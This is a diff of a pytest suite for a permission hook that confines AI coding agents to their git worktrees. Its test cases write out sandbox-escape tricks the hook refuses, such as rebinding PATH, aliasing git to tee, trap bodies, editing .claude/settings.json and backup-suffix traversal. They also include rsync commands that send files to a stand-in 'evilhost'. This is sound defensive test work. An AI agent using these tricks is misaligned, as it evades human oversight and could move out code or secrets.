-@pytest.mark.parametrize(
-    "command",
-    [
-        f"export GIT_WORK_TREE={CWD}; git -C {WT} restore -- src/a.py",
-        f"export GIT_DIR={CWD}/.git; git -C {WT} restore -- src/a.py",
-        f"export GIT_WORK_TREE={CWD}; git -C {WT}/src restore -- :/src/a.py",
-        f"declare -x FOO=1; tee {WT}/src/a.py",
-        "typeset -x FOO=1",
-        "readonly FOO=1",
-        "export FOO",
-        "set -a",
-        "set -ea",
-        "set -o allexport",
-    ],
-)
-def test_worker_shell_variable_export_is_refused(agent: str, command: str) -> None:
-    d = decide(_b(agent, command), CFG)
-    assert not d.allow and "shell variables" in str(d.reason), (agent, command)
-
-
-def test_coder_plain_unit_worktree_bash_write_still_allowed() -> None:
-    assert decide(_b("repo-coder", f"tee {WT}/src/a.py"), CFG).allow
-    assert decide(_b("repo-coder", "set -e"), CFG).allow
-
-
-def test_coder_unregistered_worktree_dir_is_refused(tmp_path: Path) -> None:
-    # 0022: only a git-registered worktree under .claude/worktrees is a unit worktree.
-    repo, wt = _unit_repo(tmp_path / "repo")
-    evil = repo / ".claude" / "worktrees" / "evil"
-    (evil / "src").mkdir(parents=True)
-    assert decide(_cwd(_w("repo-coder", f"{wt}/src/a.py"), repo), CFG).allow
-    assert not decide(_cwd(_w("repo-coder", f"{evil}/src/a.py"), repo), CFG).allow
-    assert not decide(_cwd(_b("repo-coder", f"tee {evil}/src/a.py"), repo), CFG).allow
-    assert not decide(_w("repo-coder", f"{CWD}/.claude/worktrees/u2/src/a.py"), CFG).allow
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"mkdir -p {CWD}/.claude/worktrees/evil/src",
-        "mkdir -p .claude/worktrees/evil/src",
-        "touch infra/a.tf",
-        f"rm {CWD}/infra/a.tf",
-        f"rmdir {CWD}/infra/x",
-        f"unlink {CWD}/src/a.py",
-        f"chmod 755 {CWD}/scripts/a.sh",
-    ],
-)
-def test_coder_file_mutators_outside_unit_worktree_are_refused(command: str) -> None:
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"mkdir -p {WT}/src/pkg",
-        f"touch {WT}/tests/__init__.py",
-        f"rm {WT}/src/old.py",
-        f"chmod 755 {WT}/src/run.py",
-    ],
-)
-def test_coder_file_mutators_inside_unit_worktree_are_allowed(command: str) -> None:
-    assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"cd {CWD}/infra && tee .claude/worktrees/u1/src/a.py",
-        "pushd /tmp && tee .claude/worktrees/u1/src/a.py",
-        "cd /tmp && git restore -- .claude/worktrees/u1/src/a.py",
-        "cd /tmp && git -C .claude/worktrees/u1 restore -- src/a.py",
-        "cd /tmp; cp .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
-    ],
-)
-def test_coder_relative_write_after_cd_is_refused(command: str) -> None:
-    # 0022: relative operands after cd resolve against the hook cwd, not the cd target.
-    d = decide(_b("repo-coder", command), CFG)
-    assert not d.allow and "absolute" in str(d.reason), command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"cd {WT} && tee {WT}/src/a.py",
-        f"cd /tmp && git -C {WT} restore -- src/a.py",
-        f"cd {WT} && python3 -m pytest -q",
-    ],
-)
-def test_coder_absolute_write_after_cd_is_allowed(command: str) -> None:
-    assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-def test_coder_cwd_inside_a_real_unit_worktree(tmp_path: Path) -> None:
-    # 0022: a hook cwd of the worktree or its src/ still binds writes to that worktree.
-    repo, wt = _unit_repo(tmp_path / "repo")
-    (wt / "src").mkdir()
-    for cwd in (wt, wt / "src"):
-        assert decide(_cwd(_w("repo-coder", f"{wt}/src/a.py"), cwd), CFG).allow, cwd
-        assert decide(_cwd(_w("repo-coder", f"{wt}/tests/t.py"), cwd), CFG).allow, cwd
-        assert not decide(_cwd(_w("repo-coder", f"{repo}/src/a.py"), cwd), CFG).allow, cwd
-        assert decide(_cwd(_w("repo-coder", f"{wt}/README.md"), cwd), CFG).allow, cwd
-        payload = _cwd(_w("repo-coder", f"{wt}/.claude/settings.json"), cwd)
-        assert not decide(payload, CFG).allow, cwd
-    assert decide(_cwd(_w("repo-coder", "src/a.py"), wt), CFG).allow
-
-
 def _narrowed_repo(tmp_path: Path, manifest: str) -> tuple[Path, Path]:
     repo, wt = _unit_repo(tmp_path / "repo")
     (repo / "service-manifest.json").write_text(manifest, encoding="utf-8")
@@ -2552,223 +1022,6 @@ def _narrowed_repo(tmp_path: Path, manifest: str) -> tuple[Path, Path]:
 NARROWING = {
     "jail_narrowing": {"forbidden_paths": ["infra/", "Makefile"], "forbidden_extensions": [".pem"]}
 }
-
-
-@pytest.mark.parametrize("rel", ["infra/main.tf", "infra", "Makefile", "INFRA/x.tf"])
-def test_coder_manifest_forbidden_path_is_refused(tmp_path: Path, rel: str) -> None:
-    repo, wt = _narrowed_repo(tmp_path, json.dumps(NARROWING))
-    target = f"{wt}/{rel}"
-    want = f"protected path (service-manifest.json jail_narrowing): {target}. Next:"
-    d = decide(_cwd(_w("repo-coder", target), repo), CFG)
-    assert not d.allow and str(d.reason).startswith(want), d.reason
-    d = decide(_cwd(_b("repo-coder", f"tee {target}"), repo), CFG)
-    assert not d.allow and str(d.reason).startswith(want), d.reason
-    assert decide(_cwd(_w("repo-coder", f"{wt}/infra2/x.tf"), repo), CFG).allow
-    assert decide(_cwd(_w("repo-coder", f"{wt}/Makefile.d/x"), repo), CFG).allow
-
-
-def test_coder_manifest_forbidden_extension_is_refused(tmp_path: Path) -> None:
-    repo, wt = _narrowed_repo(tmp_path, json.dumps(NARROWING))
-    for rel in ("keys/server.pem", "a.PEM"):
-        target = f"{wt}/{rel}"
-        want = f"protected extension (service-manifest.json jail_narrowing): {target}. Next:"
-        d = decide(_cwd(_w("repo-coder", target), repo), CFG)
-        assert not d.allow and str(d.reason).startswith(want), d.reason
-        d = decide(_cwd(_b("repo-coder", f"cp {wt}/src/a {target}"), repo), CFG)
-        assert not d.allow and str(d.reason).startswith(want), d.reason
-    assert decide(_cwd(_w("repo-coder", f"{wt}/src/pem.py"), repo), CFG).allow
-
-
-@pytest.mark.parametrize(
-    "manifest",
-    [
-        "{ not json",
-        "[]",
-        '{"jail_narrowing": []}',
-        '{"jail_narrowing": {"forbidden_paths": ["../x"]}}',
-    ],
-)
-def test_coder_manifest_error_fails_closed(tmp_path: Path, manifest: str) -> None:
-    repo, wt = _narrowed_repo(tmp_path, manifest)
-    for payload in (_w("repo-coder", f"{wt}/src/a.py"), _b("repo-coder", f"tee {wt}/src/a.py")):
-        d = decide(_cwd(payload, repo), CFG)
-        reason = str(d.reason)
-        assert not d.allow and "coder writes fail closed" in reason and "Next:" in reason
-    assert decide(_cwd(_b("repo-coder", "pytest -q"), repo), CFG).allow
-
-
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"hash pytest=/bin/rm; pytest {CWD}/infra/a.tf",
-        "hash -p /bin/rm pytest; pytest x",
-        f"alias git=tee; git -C {WT} status",
-        "unalias ls",
-        "unset PATH; git status",
-        "shopt -s expand_aliases",
-        "enable -n test",
-        "setopt aliases",
-        "unsetopt hashcmds",
-        "builtin cd /tmp",
-        "command rm x",
-        "eval ls",
-        "exec ls",
-        "source x.sh",
-        ". x.sh",
-    ],
-)
-def test_worker_shell_state_builtins_are_refused(agent: str, command: str) -> None:
-    # 0022: a builtin that rebinds what a later segment runs voids every later check.
-    assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-
-def test_coder_plain_git_status_in_unit_worktree_allowed() -> None:
-    assert decide(_b("repo-coder", f"git -C {WT} status"), CFG).allow
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        "mkdir newdir",
-        "touch NEWFILE",
-        "mkdir -m 700 infra2",
-        f"chown x {CWD}/infra/a.tf",
-        f"chgrp x {CWD}/infra/a.tf",
-        f"chown x:y {WT}/src/a.py {CWD}/infra/a.tf",
-        f"install --mode=644 {WT}/src/a.py {CWD}/bin/a",
-        f"find {CWD}/infra -delete",
-        f"find {WT}/src -exec rm {{}} +",
-        f"find {WT}/src -fprint {CWD}/x",
-    ],
-)
-def test_coder_bare_and_owner_operands_are_paths(command: str) -> None:
-    # 0022: every non-option operand of a coder write command is a path, no heuristic.
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"mkdir {WT}/src/pkg",
-        f"mkdir -m 700 {WT}/src/pkg",
-        f"touch {WT}/tests/__init__.py",
-        f"chown x {WT}/src/a.py",
-        f"chmod 755 {WT}/src/a.py",
-        f"install -m 644 -o x {WT}/src/a.py {WT}/src/b.py",
-        f"install --mode=644 {WT}/src/a.py {WT}/src/b.py",
-        f"truncate -s 0 {WT}/tests/out.txt",
-        f"find {WT}/src -name '*.py'",
-    ],
-)
-def test_coder_unit_worktree_operands_allowed(command: str) -> None:
-    assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        "git add -A",
-        "git add .",
-        "git add -- src/a.py",
-        "git commit -m x",
-        "git commit -a -m x",
-        f"git -C {CWD} add -A",
-        f"git -C {CWD}/.claude/worktrees/evil commit -m x",
-        f"cd {CWD}/.claude/worktrees/u1 && git commit -a -m x",
-    ],
-)
-def test_coder_add_and_commit_outside_unit_worktree_refused(command: str) -> None:
-    # 0022: staging or committing in the main checkout lands on the main branch.
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"git -C {WT} add -A",
-        f"git -C {WT} add -- {WT}/src/a.py",
-        f"git -C {WT} commit -m 'WIP: yield'",
-        f"git -C {WT}/src commit -m x",
-    ],
-)
-def test_coder_add_and_commit_in_unit_worktree_allowed(command: str) -> None:
-    assert decide(_b("repo-coder", command), CFG).allow, command
-
-
-def test_coder_add_and_commit_with_cwd_in_real_unit_worktree(tmp_path: Path) -> None:
-    repo, wt = _unit_repo(tmp_path / "repo")
-    assert decide(_cwd(_b("repo-coder", "git add -A"), wt), CFG).allow
-    assert decide(_cwd(_b("repo-coder", "git commit -m x"), wt), CFG).allow
-    assert not decide(_cwd(_b("repo-coder", "git add -A"), repo), CFG).allow
-
-
-@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"trap 'git -C {CWD} commit -am x' EXIT; ls",
-        f"printf -v PATH {CWD}/bin; pytest {CWD}/infra/a.tf",
-        "printf -vPATH x",
-        "getopts PATH x; git status",
-    ],
-)
-def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
-    # 0022: a trap body runs unchecked; printf -v and getopts rebind a variable such as PATH.
-    assert not decide(_b(agent, command), CFG).allow, (agent, command)
-
-
-def test_coder_plain_printf_allowed() -> None:
-    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"cp -t{CWD}/infra {WT}/src/a.py",
-        f"mv -t{CWD}/infra {WT}/src/a.py",
-        f"cp -rt{CWD}/infra {WT}/src/a.py",
-        f"install -t {CWD}/infra {WT}/src/a.py",
-        f"ln -st{CWD}/infra {WT}/src/a.py",
-        f"touch -r{CWD}/infra/a.tf {WT}/src/a.py",
-        f"rsync {WT}/src/a.py evilhost:x",
-        f"rsync -e touch {WT}/src/a.py evilhost:x",
-        f"rsync -avze ssh {WT}/src/ {WT}/src/pkg/",
-        f"rsync --rsh=ssh {WT}/src/ {WT}/src/pkg/",
-        f"rsync {WT}/src/a.py rsync://host/x",
-        f"rsync --exclude x {CWD}/infra/ {WT}/src/pkg/",
-    ],
-)
-def test_coder_attached_targets_and_remote_rsync_refused(command: str) -> None:
-    # 0022: an attached -t<dir> is a write target; host:path is a remote rsync operand.
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
-    _, wt = _unit_repo(tmp_path / "repo")
-    (wt / "src").mkdir()
-    for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
-        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command
-
-
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"cp -t {WT}/src/pkg {WT}/src/a.py",
-        f"cp -t{WT}/src/pkg {WT}/src/a.py",
-        f"cp --target-directory={WT}/src/pkg {WT}/src/a.py",
-        f"cp --preserve=mode {WT}/src/a.py {WT}/src/b.py",
-        f"rsync -a {WT}/src/ {WT}/src/pkg/",
-        f"rsync -a --exclude '*.pyc' {WT}/src/ {WT}/src/pkg/",
-        f"rsync -a --filter '- *.pyc' --chmod u+w {WT}/src/ {WT}/src/pkg/",
-        f"mkdir -pm 700 {WT}/src/pkg",
-        f"mkdir -m700 {WT}/src/pkg",
-        f"install --mode 644 {WT}/src/a.py {WT}/src/b.py",
-        f"touch --date 2026-01-01 {WT}/src/a.py",
-    ],
-)
-def test_coder_value_options_skipped_as_non_paths(command: str) -> None:
-    assert decide(_b("repo-coder", command), CFG).allow, command
 
 
 CREDENTIAL_PATHS = [
@@ -2990,12 +1243,12 @@ def test_unknown_agent_without_an_absolute_cwd_fails_closed() -> None:
 
 @pytest.mark.parametrize("marked", [False, True])
 def test_daedalus_agents_are_policed_with_or_without_a_train(train_cwd: Path, marked: bool) -> None:
+    # 0023, 0044: never the outside-a-train pass; lib.jail sends the call to the router.
     if marked:
         _mark(train_cwd)
     cwd = str(train_cwd)
-    assert decide(_cred("daedalus:repo-coder", "Bash", cwd, command="pytest -q"), CFG).allow
-    d = decide(_cred("daedalus:repo-coder", "Bash", cwd, command="git push origin x"), CFG)
-    assert not d.allow
+    d = decide(_cred("daedalus:repo-coder", "Bash", cwd, command="pytest -q"), CFG)
+    assert not d.allow and d.reason == jail.R_ROUTED.format(agent="repo-coder")
     d = decide(_cred("daedalus:mystery", "Bash", cwd, command="ls"), CFG)
     assert not d.allow and "fail closed" in str(d.reason)
 
@@ -3366,25 +1619,6 @@ def test_issue30_unmodelled_copiers_reading_home_are_refused(
     assert not d.allow and "credential" in str(d.reason), (command, d.reason)
 
 
-@pytest.mark.parametrize(
-    "command",
-    [
-        f"rsync -aT/opt/x {WT}/src/a.py {WT}/src/b.py",
-        f"rsync -a -T {CWD}/infra {WT}/src/a.py {WT}/src/b.py",
-        f"cp -b --suffix=/../../../infra/x {WT}/src/a.py {WT}/src/b.py",
-        f"cp -b -S /../../infra/x {WT}/src/a.py {WT}/src/b.py",
-        f"mv --backup --suffix ../x {WT}/src/a.py {WT}/src/b.py",
-    ],
-)
-def test_issue30_coder_temp_dir_and_backup_suffix_are_write_targets(command: str) -> None:
-    assert not decide(_b("repo-coder", command), CFG).allow, command
-
-
-def test_issue30_coder_plain_backup_suffix_passes() -> None:
-    command = f"cp -b --suffix=.orig {WT}/src/a.py {WT}/src/b.py"
-    assert decide(_b("repo-coder", command), CFG).allow
-
-
 @pytest.mark.parametrize("agent", [None, "Explore"])
 @pytest.mark.parametrize(
     "command",
@@ -3399,3 +1633,167 @@ def test_issue30_git_init_in_the_data_dir_is_refused(
 ) -> None:
     d = decide(_cred(agent, "Bash", str(marked_repo), command=command), CFG)
     assert not d.allow and "plugin data directory" in str(d.reason), (command, d.reason)
+
+
+# 0044: every per-agent case unit 1.4 deleted here; each copy runs in a tests/test_checks_* file.
+DELETED_CASES = (
+    "test_every_block_reason_has_next",
+    "test_workers_cannot_spawn_agents",
+    "test_workers_cannot_send_messages",
+    "test_bare_repo_coder_unchanged",
+    "TestRepoCoder.test_main_checkout_writes_refused",
+    "TestRepoCoder.test_remote_and_network_blocked",
+    "TestRepoCoder.test_local_work_allowed",
+    "TestRepoCoder.test_no_web_tools",
+    "TestContractSpec.test_writes_contracts_or_charter_specs_only",
+    "TestContractSpec.test_without_charter_root_only_contracts",
+    "TestCharterDocs.test_ledger_file_is_never_written_directly",
+    "TestCharterDocs.test_writes_charter_or_docs",
+    "TestCharterDocs.test_bash_allowlist",
+    "TestReadOnlyAgents.test_no_writes",
+    "TestReadOnlyAgents.test_auditor_read_only_pipelines_including_two_pipes",
+    "TestReadOnlyAgents.test_specialists_read_only_set",
+    "TestConductor.test_push_without_force_and_pr_ops",
+    "TestConductor.test_no_writes",
+    "TestNoShellAgents.test_blocks_bash_and_writes",
+    "TestNoShellAgents.test_only_researcher_may_fetch",
+    "test_plain_git_diff_is_allowed_baseline",
+    "test_separator_matrix_blocks",
+    "test_pipe_blocked_where_not_allowed",
+    "test_workers_blocked_on_variable_commands",
+    "TestRegressionRepoCoder.test_blocked",
+    "TestRegressionRepoCoder.test_relative_paths_resolve_against_cwd",
+    "TestRegressionRepoCoder.test_notebook_path",
+    "TestRegressionCharterDocs.test_blocked",
+    "TestRegressionCharterDocs.test_append_flags_allowed",
+    "TestRegressionCharterDocs.test_append_off_grammar_blocked",
+    "TestRegressionCharterDocs.test_append_grammar_allowed",
+    "TestRegressionCharterDocs.test_append_literal_plugin_root_blocked",
+    "TestRegressionCharterDocs.test_repo_scripts_ledger_allowed",
+    "TestRegressionCharterDocs.test_foreign_append_ledger_blocked",
+    "TestRegressionReadOnly.test_auditor_blocked",
+    "TestRegressionReadOnly.test_auditor_branch_reads_allowed",
+    "TestRegressionReadOnly.test_specialists_blocked",
+    "TestRegressionConductor.test_blocked",
+    "TestRegressionConductor.test_default_branch_reason",
+    "TestRegressionConductor.test_allowed",
+    "TestRegressionToolsAndCwd.test_workers_blocked_from_meta_tools",
+    "TestRound3Breakage.test_quoted_filters_allowed",
+    "TestRound3Breakage.test_quoted_separators_in_commit_message",
+    "TestRound3ConductorPushGrammar.test_allowed",
+    "TestRound3ConductorPushGrammar.test_blocked",
+    "TestRound3ConductorPushGrammar.test_grammar_reason",
+    "TestRound3WorkerGitGrammar.test_blocked",
+    "TestRound3WorkerGitGrammar.test_allowed",
+    "TestRound3WorkerHygiene.test_reserved_words_blocked",
+    "TestRound3WorkerHygiene.test_wrappers_blocked",
+    "TestRound3WorkerHygiene.test_env_and_token_hygiene",
+    "TestRound3WorkerHygiene.test_git_config_read_only_for_repo_coder",
+    "TestRound3WorkerHygiene.test_repo_coder_hidden_network_and_remote",
+    "TestRound3WorkerHygiene.test_runner_forms_still_allowed",
+    "TestRound3SortPytestGitleaks.test_sort_denies",
+    "TestRound3SortPytestGitleaks.test_basetemp_denied",
+    "TestRound3SortPytestGitleaks.test_gitleaks_report_path",
+    "TestRound4Conductor.test_blocked",
+    "TestRound4Conductor.test_allowed",
+    "TestRound4Breakage.test_allowed",
+    "TestRound4Breakage.test_blocked",
+    "TestFinalRemotePlumbing.test_repo_coder_blocks",
+    "TestFinalCoderGitAllowlist.test_blocked",
+    "TestFinalCoderGitAllowlist.test_allowed",
+    "TestLiveRunGrammar.test_status_read_forms_allowed",
+    "TestLiveRunGrammar.test_status_writes_and_unknown_flags_blocked",
+    "TestLiveRunGrammar.test_mypy_with_paths_allowed",
+    "TestLiveRunGrammar.test_mypy_flags_blocked",
+    "TestLiveRunGrammar.test_conductor_read_commands_allowed",
+    "TestLiveRunGrammar.test_conductor_remote_reads_blocked",
+    "TestLiveRunGrammar.test_conductor_block_message_matches_its_git_grammar",
+    "TestLiveRunGrammar.test_mypy_argfile_blocked",
+    "TestFinalCoderWriteTargets.test_blocked",
+    "TestFinalCoderWriteTargets.test_allowed",
+    "TestFinalCoderWriteTargets.test_main_checkout_blocked",
+    "TestProjectDataDir.test_worktree_cwd_protects_main_repo_data_dir",
+    "TestFinalConductorGh.test_blocked",
+    "TestFinalConductorGh.test_repo_flag_reason",
+    "TestFinalConductorGh.test_allowed",
+    "TestFixWaveLedgerResolution.test_manifest_ledger_blocked",
+    "TestFixWaveLedgerResolution.test_probed_ledger_blocked",
+    "TestFixWaveLedgerResolution.test_default_ledger_protected_beside_a_declared_one",
+    "TestFixWaveLedgerResolution.test_config_ledger_still_blocked",
+    "TestFixWaveLedgerResolution.test_no_ledger_nothing_protected",
+    "TestFixWaveLedgerResolution.test_case_variant_spelling_blocked",
+    "TestFixWaveLedgerResolution.test_hardlink_to_ledger_blocked",
+    "TestFixWaveLedgerResolution.test_symlink_to_ledger_blocked",
+    "TestFixWaveLedgerResolution.test_dotdot_path_to_ledger_blocked",
+    "TestFixWaveLedgerResolution.test_other_doc_allowed_beside_ledger",
+    "TestFixWaveLedgerResolution.test_malformed_manifest_fails_closed_with_next",
+    "TestFixWaveLedgerResolution.test_append_ledger_cli_still_allowed",
+    "TestFixWaveConductorGh.test_inline_body_blocked",
+    "TestFixWaveConductorGh.test_allowed",
+    "TestFixWaveConductorGh.test_edit_comment_diff_refused_by_0028",
+    "TestFixWaveConductorGh.test_pr_edit_body_file_allowed",
+    "TestFixWaveConductorGh.test_pr_edit_inline_body_refused",
+    "TestFixWaveGitleaksRedact.test_unredacted_blocked",
+    "TestFixWaveGitleaksRedact.test_redacted_allowed",
+    "TestFixWaveCharterDocsBash.test_blocked",
+    "TestFixWaveCharterDocsBash.test_reason_names_the_grammar",
+    "TestFixWaveCharterDocsBash.test_allowed",
+    "test_coder_writes_inside_a_unit_worktree",
+    "test_coder_write_outside_a_unit_worktree_is_refused",
+    "test_coder_write_outside_reason",
+    "test_coder_writes_anywhere_unprotected_in_its_worktree",
+    "test_coder_builtin_protected_paths_are_refused",
+    "test_coder_bash_writes_to_builtin_protected_paths_are_refused",
+    "test_coder_repo_local_ledger_in_worktree_is_refused",
+    "test_coder_restores_paths_inside_its_unit_worktree",
+    "test_coder_cannot_write_the_main_checkout",
+    "test_coder_pathspec_resolves_against_git_dash_c",
+    "test_coder_unit_worktree_through_a_symlinked_root",
+    "test_coder_pathspec_magic_is_refused",
+    "test_worker_shell_variable_export_is_refused",
+    "test_coder_plain_unit_worktree_bash_write_still_allowed",
+    "test_coder_unregistered_worktree_dir_is_refused",
+    "test_coder_file_mutators_outside_unit_worktree_are_refused",
+    "test_coder_file_mutators_inside_unit_worktree_are_allowed",
+    "test_coder_relative_write_after_cd_is_refused",
+    "test_coder_absolute_write_after_cd_is_allowed",
+    "test_coder_cwd_inside_a_real_unit_worktree",
+    "test_coder_manifest_forbidden_path_is_refused",
+    "test_coder_manifest_forbidden_extension_is_refused",
+    "test_coder_manifest_error_fails_closed",
+    "test_worker_shell_state_builtins_are_refused",
+    "test_coder_plain_git_status_in_unit_worktree_allowed",
+    "test_coder_bare_and_owner_operands_are_paths",
+    "test_coder_unit_worktree_operands_allowed",
+    "test_coder_add_and_commit_outside_unit_worktree_refused",
+    "test_coder_add_and_commit_in_unit_worktree_allowed",
+    "test_coder_add_and_commit_with_cwd_in_real_unit_worktree",
+    "test_worker_trap_getopts_printf_v_refused",
+    "test_coder_plain_printf_allowed",
+    "test_coder_attached_targets_and_remote_rsync_refused",
+    "test_coder_rsync_remote_refused_from_unit_worktree_cwd",
+    "test_coder_value_options_skipped_as_non_paths",
+    "test_issue30_coder_temp_dir_and_backup_suffix_are_write_targets",
+    "test_issue30_coder_plain_backup_suffix_passes",
+)
+
+
+def _case_names(path: Path) -> set[str]:
+    # 0044: top-level test names, and Class.method for methods of a test class.
+    names: set[str] = set()
+    for node in ast.parse(path.read_text(encoding="utf-8")).body:
+        if isinstance(node, ast.FunctionDef):
+            names.add(node.name)
+        elif isinstance(node, ast.ClassDef):
+            names |= {f"{node.name}.{n.name}" for n in node.body if isinstance(n, ast.FunctionDef)}
+    return names
+
+
+def test_every_deleted_case_has_a_destination() -> None:
+    assert len(DELETED_CASES) == len(set(DELETED_CASES))
+    copied: set[str] = set()
+    for path in sorted((REPO_ROOT / "tests").glob("test_checks_*.py")):
+        copied |= _case_names(path)
+    assert [name for name in DELETED_CASES if name not in copied] == []
+    here = _case_names(Path(__file__))
+    assert [name for name in DELETED_CASES if name in here] == []
